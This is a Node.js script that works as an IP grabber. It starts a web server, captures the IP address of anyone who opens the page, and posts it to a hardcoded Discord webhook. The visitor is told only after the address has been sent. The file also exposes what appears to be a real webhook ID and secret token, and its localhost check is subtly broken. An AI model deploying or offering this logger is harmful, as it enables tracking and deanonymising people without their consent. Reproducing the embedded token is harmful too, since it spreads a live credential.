const http = require('http');
const axios = require('axios');

// URL del webhook de Discord (asegúrate de haberla configurado correctamente)
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1311479610889998447/2_qULEQnSU6-khVLRyDKPNmysIHYeyt_awhMlAWb6TuNAHpiyoOrUa0XuhfAlJeeyEhm';

// Crear el servidor HTTP
const server = http.createServer((req, res) => {
    if (req.method === 'GET') {
        // Obtenemos la IP real del usuario
        let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

        // Si estamos en un entorno local, esto devolverá '::1' o '127.0.0.1' en lugar de la IP real
        // Limpiar la IP para obtener solo la real
        userIP = userIP.split(',')[0];  // Si hay múltiples IPs (en caso de estar detrás de un proxy), usamos la primera
        userIP = userIP.replace(/^.*:/, '');  // Eliminamos el prefijo '::1' o similar

        // Si estamos en un entorno local, la IP suele ser '127.0.0.1', por lo que la cambiamos por la IP externa
        if (userIP === '127.0.0.1' || userIP === '::1') {
            userIP = 'IP externa detectada';
        }

        // Mostrar la IP capturada en consola para depuración
        console.log(`IP capturada: ${userIP}`);

        // Enviar la IP al webhook de Discord
        axios.post(DISCORD_WEBHOOK_URL, {
            content: `Nueva IP registrada: ${userIP}`,
        })
        .then(() => {
            console.log(`IP enviada al webhook: ${userIP}`);
        })
        .catch((err) => {
            console.error('Error al enviar al webhook:', err.message);
        });

        // Responder al navegador con un mensaje
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h1>Tu IP ha sido registrada y enviada al servidor de Discord.</h1>');
    }
});

// Escuchar en el puerto 3000
server.listen(3000, () => {
    console.log('Servidor ejecutándose en http://localhost:3000');
});
